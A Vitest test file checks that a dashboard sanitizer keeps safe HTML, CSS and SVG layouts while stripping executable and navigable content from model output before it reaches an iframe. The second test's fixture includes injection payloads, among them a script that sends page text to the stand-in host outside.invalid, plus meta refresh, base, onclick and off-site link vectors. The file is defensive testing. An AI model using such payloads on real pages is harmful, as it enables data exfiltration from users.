// @vitest-environment jsdom
import { describe, expect, it } from 'vitest'
import { dashboardDocument } from '../pages/chat/command-center/dashboardDocument'

describe('task dashboard document isolation', () => {
  it('preserves free HTML/CSS/SVG layouts and native disclosure controls', () => {
    const html = dashboardDocument('<style>.board{display:grid}</style><article class="board"><h1>Release map</h1><details><summary>Evidence</summary>Verified</details><svg><path d="M0 0L10 10" /></svg><a href="#evidence">Jump</a></article>', { '--bg': '#111' }, 'dark')
    const doc = new DOMParser().parseFromString(html, 'text/html')
    expect(doc.querySelector('article h1')?.textContent).toBe('Release map')
    expect(doc.querySelector('details summary')?.textContent).toBe('Evidence')
    expect(doc.querySelector('svg path')).not.toBeNull()
    expect(doc.querySelector('a')?.getAttribute('href')).toBe('#evidence')
    expect(html).toContain('.board{display:grid}')
    expect(html).toContain('--bg:#111')
    expect(doc.head.firstElementChild?.getAttribute('content')).toContain("script-src 'none'")
  })

  it('removes executable, speculative and navigable model content before it reaches an iframe', () => {
    const html = dashboardDocument(`<meta http-equiv="refresh" content="0;url=https://outside.invalid/private">
      <link rel="dns-prefetch" href="https://private.outside.invalid"><base href="https://outside.invalid/">
      <script>location.href='https://outside.invalid/'+document.body.innerText</script>
      <iframe srcdoc="private"></iframe><object data="https://outside.invalid"></object>
      <template><script>bad()</script></template><noscript><img src="https://outside.invalid"></noscript>
      <p onclick="bad()">Private task</p><a href="https://outside.invalid/private">Open</a>
      <svg><a xlink:href="https://outside.invalid/private"><text>Label</text></a><set attributeName="href" to="https://outside.invalid" /></svg>`, {}, 'light')
    const doc = new DOMParser().parseFromString(html, 'text/html')
    expect(doc.querySelectorAll('script,link,base,iframe,object,template,noscript,set,[onclick],[href],[xlink\\:href]')).toHaveLength(0)
    expect(doc.querySelectorAll('meta')).toHaveLength(1)
    expect(doc.head.firstElementChild?.getAttribute('content')).toContain("default-src 'none'")
    expect(doc.body.textContent).toContain('Private task')
    expect(html).not.toContain('outside.invalid')
  })
})
